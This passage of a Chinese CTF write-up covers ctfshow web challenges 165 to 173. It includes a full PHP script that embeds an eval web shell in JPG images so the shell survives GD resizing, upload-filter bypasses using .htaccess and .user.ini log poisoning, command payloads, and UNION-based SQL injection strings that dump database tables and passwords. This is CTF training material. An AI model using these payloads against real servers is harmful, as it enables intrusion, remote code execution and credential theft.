class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将一张 jpg 照片放到同目录下，随后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php web165.php 5.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web165-1.png"></p><p>在题中上传图片，上传成功后，查看图片，然后进行POST传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1</span>=system(<span class="string">&#x27;tac f*&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>抓包后，发到Repeater模块中，就可以找到flag了(没成功，成功率比较低)</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web165-2.png"></p><h3 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h3><p>右键查看源码发现要上传 zip</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web166.png"></p><p>直接上传一句话，用bp抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意：有时候会出错，是因为</span><br><span class="line">要改一下MIME类型：Content-Type: application/zip</span><br><span class="line">需要修改成：Content-Type: application/x-zip-compressed</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web166-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web166-2.png"></p><p>点击下载，发现代码不会执行代码，而是单纯的下载。我们需要右键下载文件复制地址然后使用 harkbar 操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pass=system(&quot;cat ../f*&quot;);die();</span><br><span class="line">//如果不使用die（）那么就会直接下载文件不会显示内容，原因是因为这个Content-Type: application/x-zip-compressed</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web166-3.png"></p><h3 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h3><p>查看源码需要 jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167.png"></p><p>使用上一题的方法，发现访问不到该图片了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167-1.png"></p><p>使之报错发现中间件是 Apache</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167-2.png"></p><p>之前上传的配置文件都是针对Nginx的.ini，这次我们针对Apache换一个姿势</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关于.htaccess 和.user.ini 配置文件</span><br><span class="line">https://www.dazhuanlan.com/vip_mmles/topics/1547397</span><br><span class="line"></span><br><span class="line">.htaccess 是 Apache 的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</span><br></pre></td></tr></table></figure><p>姿势：</p><p>先上传一个jpg文件，抓包修改名称为.htaccess 只要后缀（这个操作就是平时打的靶场）</p><p>文件内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php</span><br><span class="line">或者</span><br><span class="line">SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167-3.png"></p><p>然后在上传图片马</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167-4.png"></p><p>接着就是和上一题一样下载传命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web167-5.png"></p><h3 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h3><p>右键查看源代码回到 png</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web168.png"></p><p>直接上传马子发现返回空，说明被过滤了,尝试后发现过滤了<code>eval</code>和<code>system,$_POST $_GET</code>等等，真要传马子的话这题需要免杀</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web168-1.png"></p><p>我们直接上传文件能不能直接执行代码，抓包改后缀，发现照片被直接执行了，且<code>&lt;?php phpinfo();?&gt;</code>能够被正常执行</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web168-2.png"></p><p>那么我们试试别的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`ls`?&gt;</span><br><span class="line">&lt;?=`ls ../`?&gt;  //真正的flag在这个目录</span><br><span class="line">&lt;?=`tac ../flagaa.php`?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web168-3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web168-4.png"></p><h3 id="wbe169"><a href="#wbe169" class="headerlink" title="wbe169"></a>wbe169</h3><p>右键查看源代码发现需要上传zip</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169.png"></p><p>但是直接上传zip不行，需要将content-type改为image/png (很怪)，但是也是显示为null</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-3.png"></p><p>尝试上传php文件发现过滤了&lt;&gt;?，<code>.user.ini</code>也是可以上传的，且没有过滤</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-4.png"></p><p>那么我们继续使用前面的使用日志文件包含</p><p>先上传.user.ini文件，内容为auto_append_file=/var/log/nginx/access.log</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">这里是利用nginx日志路径包含</span><br><span class="line">这样就可以往UA里写入一句话了，也可以直接执行命令 &lt;?=`tac ../flagaa.php`?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-6.png"></p><p>然后在上传一个php文件，头部添加代码执行</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-7.png"></p><p>因为index.php文件不存在，所以我们要访问我们上传的文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-8.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web169-5.png"></p><h3 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h3><p>查看源码还是上传zip但是content-type类型要为image/png，还是可以上传<code>.user.ini</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web170.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web170-1.png"></p><p>我们继续使用日志文件包含，直接头部嵌入代码执行</p><p><img src=""><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web170-2.png" alt="web170-2"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web170-3.png"></p><h2 id="SQL注入（171-253）"><a href="#SQL注入（171-253）" class="headerlink" title="SQL注入（171-253）"></a>SQL注入（171-253）</h2><h3 id="web171（SQL语句无过滤↓↓↓）"><a href="#web171（SQL语句无过滤↓↓↓）" class="headerlink" title="web171（SQL语句无过滤↓↓↓）"></a>web171（SQL语句无过滤↓↓↓）</h3><p>题目给出了sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171.png"></p><p>当我们输入id=1的时候，语句代入数据库中查询就会变成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27; limit 1;</span><br></pre></td></tr></table></figure><p>如果我们加个单引号，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27;&#x27; limit 1;</span><br></pre></td></tr></table></figure><p>导致sql语句不规范会报错</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-1.png"></p><p>我们添加注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27;-- -&#x27; limit 1;</span><br></pre></td></tr></table></figure><p>这样数据库接收到的语句是这样的，语法没问题不再报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !=&#x27;flag&#x27; and id =&#x27;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-2.png"></p><p>接下来我们用<code>order by</code>语句测试有多少列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 4-- -</span><br></pre></td></tr></table></figure><p>没有那么多列报错了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-3.png"></p><p>减少为3，正常执行，说明有3列(当然明眼的师傅前面已经看得出是只有三列了)</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-4.png"></p><p>接着我们要查显示位，我们查一下数据库名字，这里用union语句来连接查询，并且在前面把id改成-1以达到把查询id回显的数据给置空的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3 --+</span><br><span class="line">-1&#x27; union select database(),2,3 -- -</span><br></pre></td></tr></table></figure><p>三个位置都可以回显，当前数据库名</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-6.png"></p><p>回显出数据库名字为ctfshow_web，接下来查询表，这里我们用group_concat函数，它可以把相同行的数据都组合起来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=&quot;ctfshow_web&quot; --+</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-7.png"></p><p>查出表名为ctfshow_user，接下来再去查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&quot;ctfshow_user&quot;--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-8.png"></p><p>得到有id,username,password三个列名，然后再password中找到了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web171-9.png"></p><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>本题在注入点1直接找是没找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web172.png"></p><p>那么从头来，原因是有俩表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web172-1.png"></p><p>我们换一个数据库找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select password,2,3 from ctfshow_user2--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web172-2.png"></p><h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>查询出来有3列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web173.png"></p><p>直接查表名，有3个，经验告诉我们flag在表3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web173-1.png"></p><p>拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select password,2,3 from ctfow_user3-- -</span><br></pre></td></tr></table></figure><h3 